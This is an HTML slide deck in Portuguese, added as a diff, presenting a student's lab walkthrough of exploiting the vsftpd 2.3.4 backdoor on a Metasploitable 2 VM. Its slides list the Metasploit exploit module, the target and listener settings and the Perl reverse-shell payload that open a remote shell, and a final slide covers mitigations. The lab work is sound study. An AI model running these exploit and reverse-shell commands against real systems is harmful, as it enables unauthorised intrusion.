@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Simulação de Invasão vsftpd 2.3.4 | Portfólio de Cibersegurança</title>
+  <style>
+    :root {
+      --bg: #070d1e;
+      --card-bg: #111c3a;
+      --card-border: #1c2e56;
+      --accent-cyan: #00f0ff;
+      --accent-green: #00e676;
+      --accent-red: #ff5252;
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+      --code-bg: #030712;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--text-main);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    header {
+      width: 100%;
+      max-width: 1280px;
+      padding: 18px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--card-border);
+    }
+    .logo {
+      font-weight: 700;
+      font-size: 1.1rem;
+      color: var(--accent-cyan);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .badge {
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 9999px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      background: rgba(0, 240, 255, 0.1);
+      color: var(--accent-cyan);
+      border: 1px solid rgba(0, 240, 255, 0.3);
+    }
+    .container {
+      width: 100%;
+      max-width: 1280px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      padding: 24px;
+    }
+    .slide-deck {
+      position: relative;
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 16px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 20px rgba(0,240,255,0.05);
+      min-height: 580px;
+      display: flex;
+      overflow: hidden;
+    }
+    .slide {
+      display: none;
+      width: 100%;
+      padding: 36px 44px;
+      animation: fadeIn 0.25s ease-in-out;
+    }
+    .slide.active {
+      display: flex;
+      flex-direction: column;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    /* Cover slide */
+    .cover-content {
+      margin: auto;
+      text-align: center;
+      max-width: 800px;
+    }
+    .cover-content h1 {
+      font-size: 2.5rem;
+      margin: 16px 0 12px;
+      color: #fff;
+      line-height: 1.2;
+    }
+    .cover-content h2 {
+      font-size: 1.25rem;
+      color: var(--accent-green);
+      font-weight: 500;
+      margin-bottom: 24px;
+    }
+    .cover-content p {
+      color: var(--text-muted);
+      font-size: 0.95rem;
+      line-height: 1.6;
+    }
+    /* Content Slide */
+    .slide-header {
+      margin-bottom: 24px;
+    }
+    .slide-title {
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: #fff;
+      margin-top: 6px;
+    }
+    .slide-body {
+      display: grid;
+      grid-template-columns: 1fr 1.25fr;
+      gap: 32px;
+      flex: 1;
+    }
+    .slide-body.full-width {
+      grid-template-columns: 1fr;
+    }
+    .left-panel {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .command-box {
+      background: var(--code-bg);
+      border: 1px solid rgba(0, 230, 118, 0.4);
+      border-radius: 10px;
+      padding: 14px 18px;
+    }
+    .command-box .label {
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      font-weight: 700;
+      color: var(--accent-cyan);
+      margin-bottom: 6px;
+      letter-spacing: 0.5px;
+    }
+    .command-box code {
+      font-family: "Consolas", "Courier New", monospace;
+      font-size: 0.95rem;
+      color: var(--accent-green);
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .explanation-box {
+      background: rgba(3, 7, 18, 0.5);
+      border: 1px solid var(--card-border);
+      border-radius: 10px;
+      padding: 18px;
+      flex: 1;
+    }
+    .explanation-box h4 {
+      font-size: 0.85rem;
+      text-transform: uppercase;
+      color: var(--accent-cyan);
+      letter-spacing: 0.5px;
+      margin-bottom: 12px;
+    }
+    .explanation-box ul {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .explanation-box li {
+      font-size: 0.95rem;
+      line-height: 1.5;
+      color: #e2e8f0;
+      position: relative;
+      padding-left: 20px;
+    }
+    .explanation-box li::before {
+      content: "•";
+      color: var(--accent-green);
+      font-size: 1.3rem;
+      position: absolute;
+      left: 2px;
+      top: -3px;
+    }
+    .image-preview {
+      background: var(--code-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      box-shadow: inset 0 0 20px rgba(0,0,0,0.6);
+      padding: 8px;
+    }
+    .image-preview img {
+      max-width: 100%;
+      max-height: 440px;
+      object-fit: contain;
+      border-radius: 6px;
+      border: 1px solid rgba(0, 240, 255, 0.2);
+    }
+    .list-card {
+      background: rgba(3, 7, 18, 0.6);
+      border: 1px solid var(--card-border);
+      border-radius: 12px;
+      padding: 24px;
+    }
+    .list-card ul {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .list-card li {
+      font-size: 1.05rem;
+      line-height: 1.6;
+      color: #e2e8f0;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+    }
+    .list-card li span.bullet {
+      color: var(--accent-green);
+      font-weight: bold;
+    }
+    /* Controls Footer */
+    .controls {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 18px;
+      padding: 0 4px;
+    }
+    .btn-group {
+      display: flex;
+      gap: 10px;
+    }
+    button, .link-btn {
+      background: var(--card-bg);
+      color: var(--text-main);
+      border: 1px solid var(--card-border);
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.2s ease;
+      text-decoration: none;
+    }
+    button:hover, .link-btn:hover {
+      background: rgba(0, 240, 255, 0.1);
+      border-color: var(--accent-cyan);
+      color: var(--accent-cyan);
+    }
+    button:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+      border-color: var(--card-border);
+      color: var(--text-muted);
+    }
+    .slide-counter {
+      font-size: 0.9rem;
+      color: var(--text-muted);
+      font-weight: 500;
+    }
+    .kbd-tip {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      margin-top: 12px;
+      text-align: center;
+    }
+    kbd {
+      background: #1e293b;
+      padding: 2px 6px;
+      border-radius: 4px;
+      border: 1px solid #334155;
+      font-size: 0.75rem;
+      color: #94a3b8;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo">
+      <span>🛡️</span> Portfólio de Cibersegurança: vsftpd 2.3.4
+    </div>
+    <div style="display: flex; gap: 12px; align-items: center;">
+      <span class="badge">VirtualBox • Kali • Metasploitable 2 • ABNT2</span>
+      <a class="link-btn" href="Simulacao_Exploit_FTP_vsftpd.pptx" download>📥 Baixar PPTX</a>
+    </div>
+  </header>
+
+  <main class="container">
+    <div class="slide-deck" id="deck">
+
+      <!-- Slide 1: Cover -->
+      <section class="slide active">
+        <div class="cover-content">
+          <span class="badge">PROJETO DE ESTUDO & PORTFÓLIO</span>
+          <h1>Simulação de Invasão:<br/>Vulnerabilidade vsftpd 2.3.4</h1>
+          <h2>Laboratório Prático de Cibersegurança em Ambiente Controlado</h2>
+          <p>
+            Demonstração prática do ciclo de invasão em serviço FTP, desde a identificação do alvo até a obtenção de acesso remoto (Reverse Shell), com explicações didáticas linha a linha.
+          </p>
+          <div style="margin-top: 28px; display: flex; justify-content: center; gap: 16px;">
+            <button onclick="nextSlide()" style="background: rgba(0,240,255,0.15); border-color: var(--accent-cyan); color: var(--accent-cyan); padding: 12px 28px; font-size: 1rem;">
+              Começar Apresentação ▶
+            </button>
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 2: Overview -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">ARQUITETURA & AMBIENTE</span>
+          <h2 class="slide-title">Visão Geral e Arquitetura do Laboratório</h2>
+        </div>
+        <div class="slide-body full-width">
+          <div class="list-card">
+            <ul>
+              <li><span class="bullet">▶</span> <strong>Ambiente Controlado:</strong> Testes executados em rede interna virtualizada e isolada no Oracle VM VirtualBox, sem conexão com redes externas.</li>
+              <li><span class="bullet">▶</span> <strong>Máquina Atacante:</strong> Kali Linux (IP 192.168.18.110), configurado no padrão de teclado ABNT2 (<code>setxkbmap -model abnt2 -layout br</code>).</li>
+              <li><span class="bullet">▶</span> <strong>Máquina Alvo:</strong> Metasploitable 2 (IP 192.168.18.114), sistema Linux propositalmente vulnerável para treinamento e estudos.</li>
+              <li><span class="bullet">▶</span> <strong>Vulnerabilidade Explorada:</strong> CVE-2011-2523 (Backdoor histórico no serviço FTP vsftpd 2.3.4 acionado ao inserir um smiley <code>:)</code>).</li>
+              <li><span class="bullet">▶</span> <strong>Aviso Ético:</strong> Conteúdo realizado exclusivamente para aprendizado e fortalecimento da segurança defensiva.</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 3: Step 1 -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">PASSO 01 • METASPLOITABLE 2 (ALVO)</span>
+          <h2 class="slide-title">Passo 1: Acesso Inicial à Máquina Alvo</h2>
+        </div>
+        <div class="slide-body">
+          <div class="left-panel">
+            <div class="command-box">
+              <div class="label">Comando / Credenciais:</div>
+              <code>login: msfadmin&#10;password: msfadmin</code>
+            </div>
+            <div class="explanation-box">
+              <h4>O que cada linha faz:</h4>
+              <ul>
+                <li>Inicialização do servidor de laboratório Metasploitable 2 no VirtualBox.</li>
+                <li>Autenticação com as credenciais padrão de treinamento (usuário <code>msfadmin</code> e senha <code>msfadmin</code>).</li>
+                <li>Garante que a máquina vítima está ativa e com os serviços de rede iniciados.</li>
+              </ul>
+            </div>
+          </div>
+          <div class="image-preview">
+            <img src="img/01_login_metasploitable.png" alt="Passo 1: Login">
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 4: Step 2 -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">PASSO 02 • METASPLOITABLE 2 (ALVO)</span>
+          <h2 class="slide-title">Passo 2: Criação da Flag (Prova de Conceito)</h2>
+        </div>
+        <div class="slide-body">
+          <div class="left-panel">
+            <div class="command-box">
+              <div class="label">Comando Executado:</div>
+              <code>echo flag.txt > flag.txt</code>
+            </div>
+            <div class="explanation-box">
+              <h4>O que cada linha faz:</h4>
+              <ul>
+                <li><code>echo flag.txt</code>: Imprime o texto "flag.txt" na saída do console.</li>
+                <li><code>></code>: Operador de redirecionamento que grava a saída em um novo arquivo em vez de apenas mostrar na tela.</li>
+                <li><code>flag.txt</code>: Nome do arquivo criado. Em segurança, a "flag" atua como evidência de que conseguimos ler/alterar arquivos no alvo após a invasão.</li>
+              </ul>
+            </div>
+          </div>
+          <div class="image-preview">
+            <img src="img/02_criar_flag.png" alt="Passo 2: Criação da Flag">
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 5: Step 3 -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">PASSO 03 • METASPLOITABLE 2 (ALVO)</span>
+          <h2 class="slide-title">Passo 3: Verificação da Existência da Flag</h2>
+        </div>
+        <div class="slide-body">
+          <div class="left-panel">
+            <div class="command-box">
+              <div class="label">Comando Executado:</div>
+              <code>ls</code>
+            </div>
+            <div class="explanation-box">
+              <h4>O que cada linha faz:</h4>
+              <ul>
+                <li><code>ls</code> (list): Lista os arquivos e pastas presentes no diretório atual.</li>
+                <li>Confirmamos visualmente a presença do arquivo <code>flag.txt</code> recém-criado.</li>
+                <li>Identificamos também a pasta <code>vulnerable</code> já presente no sistema.</li>
+              </ul>
+            </div>
+          </div>
+          <div class="image-preview">
+            <img src="img/03_verificar_flag.png" alt="Passo 3: Verificação da Flag">
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 6: Step 4 -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">PASSO 04 • RECONHECIMENTO DE REDE</span>
+          <h2 class="slide-title">Passo 4: Identificação do Endereço IP do Alvo</h2>
+        </div>
+        <div class="slide-body">
+          <div class="left-panel">
+            <div class="command-box">
+              <div class="label">Comando Executado:</div>
+              <code>ip a</code>
+            </div>
+            <div class="explanation-box">
+              <h4>O que cada linha faz:</h4>
+              <ul>
+                <li><code>ip a</code> (ip address): Exibe todas as placas de rede do computador e seus IPs.</li>
+                <li>Na interface <code>eth0</code>, encontramos o endereço IP <strong>192.168.18.114/24</strong>.</li>
+                <li>Esse endereço é essencial: é ele que definiremos como alvo (RHOSTS) no Kali Linux.</li>
+              </ul>
+            </div>
+          </div>
+          <div class="image-preview">
+            <img src="img/04_identificar_ip_alvo.png" alt="Passo 4: Descoberta do IP">
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 7: Step 5 -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">PASSO 05 • KALI LINUX (ATACANTE)</span>
+          <h2 class="slide-title">Passo 5: Inicialização do Metasploit no Kali Linux</h2>
+        </div>
+        <div class="slide-body">
+          <div class="left-panel">
+            <div class="command-box">
+              <div class="label">Comando Executado:</div>
+              <code>msfconsole</code>
+            </div>
+            <div class="explanation-box">
+              <h4>O que cada linha faz:</h4>
+              <ul>
+                <li><code>msfconsole</code>: Abre a interface interativa do Metasploit Framework.</li>
+                <li>É a ferramenta padrão de mercado para testes de intrusão e validação de vulnerabilidades.</li>
+                <li><strong>Nota ABNT2:</strong> Kali configurado com layout ABNT2 para facilitar digitação de barras, interrogações e caminhos de exploits.</li>
+              </ul>
+            </div>
+          </div>
+          <div class="image-preview">
+            <img src="img/05_iniciar_msfconsole.png" alt="Passo 5: Metasploit">
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 8: Step 6 -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">PASSO 06 • KALI LINUX (EXPLOIT)</span>
+          <h2 class="slide-title">Passo 6: Seleção do Exploit e Definição do Alvo</h2>
+        </div>
+        <div class="slide-body">
+          <div class="left-panel">
+            <div class="command-box">
+              <div class="label">Comandos Executados:</div>
+              <code>use exploit/unix/ftp/vsftpd_234_backdoor&#10;set rhosts 192.168.18.114</code>
+            </div>
+            <div class="explanation-box">
+              <h4>O que cada linha faz:</h4>
+              <ul>
+                <li><code>use exploit/...</code>: Carrega o exploit que aproveita o backdoor do vsftpd 2.3.4 na porta 21 (FTP).</li>
+                <li><code>set rhosts 192.168.18.114</code>: <em>Remote Hosts</em>: informa ao Metasploit o endereço IP da máquina que será atacada.</li>
+              </ul>
+            </div>
+          </div>
+          <div class="image-preview">
+            <img src="img/06_configurar_exploit_rhosts.png" alt="Passo 6: Exploit e RHOSTS">
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 9: Step 7 -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">PASSO 07 • KALI LINUX (PAYLOADS)</span>
+          <h2 class="slide-title">Passo 7: Listagem dos Payloads Compatíveis</h2>
+        </div>
+        <div class="slide-body">
+          <div class="left-panel">
+            <div class="command-box">
+              <div class="label">Comando Executado:</div>
+              <code>show payloads</code>
+            </div>
+            <div class="explanation-box">
+              <h4>O que cada linha faz:</h4>
+              <ul>
+                <li><code>show payloads</code>: Exibe todas as opções de cargas úteis compatíveis com este exploit.</li>
+                <li>Um <em>payload</em> é o código executado na máquina vítima após a invasão (ex: criar um usuário, abrir um terminal remoto).</li>
+              </ul>
+            </div>
+          </div>
+          <div class="image-preview">
+            <img src="img/07_listar_payloads.png" alt="Passo 7: Payloads">
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 10: Step 8 -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">PASSO 08 • KALI LINUX (PAYLOAD)</span>
+          <h2 class="slide-title">Passo 8: Seleção do Payload Perl Reverso</h2>
+        </div>
+        <div class="slide-body">
+          <div class="left-panel">
+            <div class="command-box">
+              <div class="label">Payload Selecionado (Linha 538):</div>
+              <code>payload/cmd/unix/reverse_perl</code>
+            </div>
+            <div class="explanation-box">
+              <h4>O que cada linha faz:</h4>
+              <ul>
+                <li>Selecionamos o payload em Perl para abrir um terminal reverso.</li>
+                <li>Uma conexão reversa parte da máquina vítima em direção à máquina atacante, contornando a maioria das regras padrão de firewall de entrada.</li>
+              </ul>
+            </div>
+          </div>
+          <div class="image-preview">
+            <img src="img/08_selecionar_reverse_perl.png" alt="Passo 8: Seleção de Payload">
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 11: Step 9 -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">PASSO 09 • EXECUÇÃO DO ATAQUE</span>
+          <h2 class="slide-title">Passo 9: Configuração do LHOST e Disparo do Exploit</h2>
+        </div>
+        <div class="slide-body">
+          <div class="left-panel">
+            <div class="command-box">
+              <div class="label">Comandos Executados:</div>
+              <code>set payload payload/cmd/unix/reverse_perl&#10;set lhost 192.168.18.110&#10;exploit</code>
+            </div>
+            <div class="explanation-box">
+              <h4>O que cada linha faz:</h4>
+              <ul>
+                <li><code>set payload ...</code>: Aplica o payload Perl ao módulo.</li>
+                <li><code>set lhost 192.168.18.110</code>: <em>Local Host</em>: IP do Kali para receber a conexão reversa.</li>
+                <li><code>exploit</code>: Dispara o ataque. Metasploit confirma: <code>Command shell session 1 opened</code>!</li>
+              </ul>
+            </div>
+          </div>
+          <div class="image-preview">
+            <img src="img/09_configurar_lhost_disparar_exploit.png" alt="Passo 9: Exploit">
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 12: Step 10 -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">PASSO 10 • ACESSO CONFIRMADO</span>
+          <h2 class="slide-title">Passo 10: Sucesso da Invasão e Validação da Sessão</h2>
+        </div>
+        <div class="slide-body">
+          <div class="left-panel">
+            <div class="command-box">
+              <div class="label">Comando Executado (Dentro da Sessão):</div>
+              <code>ip a</code>
+            </div>
+            <div class="explanation-box">
+              <h4>O que cada linha faz:</h4>
+              <ul>
+                <li>Executamos <code>ip a</code> remotamente dentro da sessão de terminal aberta no alvo.</li>
+                <li>O resultado exibe o IP <strong>192.168.18.114</strong> da máquina Metasploitable.</li>
+                <li>Comprova sem dúvidas o controle total de comandos na máquina vítima direto pelo Kali!</li>
+              </ul>
+            </div>
+          </div>
+          <div class="image-preview">
+            <img src="img/10_sessao_remota_sucesso.png" alt="Passo 10: Sucesso">
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 13: Defense -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">SEGURANÇA DEFENSIVA (BLUE TEAM)</span>
+          <h2 class="slide-title">Como Prevenir e Mitigar essa Falha</h2>
+        </div>
+        <div class="slide-body full-width">
+          <div class="list-card">
+            <ul>
+              <li><span class="bullet">🛡️</span> <strong>Atualização Imediata:</strong> Versões desatualizadas como o vsftpd 2.3.4 devem ser atualizadas para versões seguras e suportadas.</li>
+              <li><span class="bullet">🛡️</span> <strong>Desativação de Protocolos Inseguros:</strong> Evitar o FTP comum (texto claro) e adotar SFTP (SSH File Transfer Protocol) ou FTPS (FTP sobre TLS).</li>
+              <li><span class="bullet">🛡️</span> <strong>Firewall e Segmentação de Rede:</strong> Bloquear portas não utilizadas e restringir o tráfego de saída do servidor para portas autorizadas.</li>
+              <li><span class="bullet">🛡️</span> <strong>Monitoramento e IDS/IPS:</strong> Utilizar ferramentas como Snort ou Suricata para alertar conexões maliciosas com padrões de exploits.</li>
+              <li><span class="bullet">🛡️</span> <strong>Menor Privilégio:</strong> Nunca executar daemons de rede com permissões de administrador (root).</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- Slide 14: Conclusion -->
+      <section class="slide">
+        <div class="slide-header">
+          <span class="badge">CONCLUSÃO & APRENDIZADOS</span>
+          <h2 class="slide-title">Conclusão do Projeto e Portfólio</h2>
+        </div>
+        <div class="slide-body full-width">
+          <div class="list-card">
+            <ul>
+              <li><span class="bullet">✅</span> <strong>Ciclo de Teste de Intrusão:</strong> Prática completa englobando Reconhecimento, Configuração de Exploit, Payload e Pós-Exploração.</li>
+              <li><span class="bullet">✅</span> <strong>Laboratório Virtualizado:</strong> Ambiente seguro com Oracle VM VirtualBox permitindo testes práticos sem riscos a terceiros.</li>
+              <li><span class="bullet">✅</span> <strong>Precisão Técnica:</strong> Configuração do teclado Linux nas normas ABNT2 para execução perfeita dos comandos.</li>
+              <li><span class="bullet">✅</span> <strong>Material de Portfólio:</strong> Repositório documentado no GitHub acompanhado de slides PPTX e explicações linha a linha.</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+    </div>
+
+    <!-- Controls -->
+    <div class="controls">
+      <div class="btn-group">
+        <button id="prevBtn" onclick="prevSlide()" disabled>◀ Anterior</button>
+        <button id="nextBtn" onclick="nextSlide()">Próximo ▶</button>
+      </div>
+      <div class="slide-counter" id="counter">Slide 1 de 14</div>
+      <div class="btn-group">
+        <button onclick="toggleFullScreen()">⛶ Tela Cheia</button>
+      </div>
+    </div>
+    <div class="kbd-tip">
+      Dica: Você pode usar as setas <kbd>◀</kbd> e <kbd>▶</kbd> do teclado ou a barra de espaço para navegar entre os slides.
+    </div>
+  </main>
+
+  <script>
+    const slides = document.querySelectorAll('.slide');
+    const prevBtn = document.getElementById('prevBtn');
+    const nextBtn = document.getElementById('nextBtn');
+    const counter = document.getElementById('counter');
+    let currentIndex = 0;
+
+    function updateSlide(index) {
+      slides.forEach((s, i) => {
+        s.classList.toggle('active', i === index);
+      });
+      prevBtn.disabled = index === 0;
+      nextBtn.disabled = index === slides.length - 1;
+      counter.textContent = `Slide ${index + 1} de ${slides.length}`;
+      currentIndex = index;
+    }
+
+    function prevSlide() {
+      if (currentIndex > 0) updateSlide(currentIndex - 1);
+    }
+
+    function nextSlide() {
+      if (currentIndex < slides.length - 1) updateSlide(currentIndex + 1);
+    }
+
+    function toggleFullScreen() {
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen().catch(err => {});
+      } else {
+        if (document.exitFullscreen) document.exitFullscreen();
+      }
+    }
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'ArrowRight' || e.key === ' ' || e.key === 'PageDown') {
+        nextSlide();
+      } else if (e.key === 'ArrowLeft' || e.key === 'PageUp') {
+        prevSlide();
+      } else if (e.key === 'f' || e.key === 'F') {
+        toggleFullScreen();
+      }
+    });
+  </script>
+</body>
+</html>
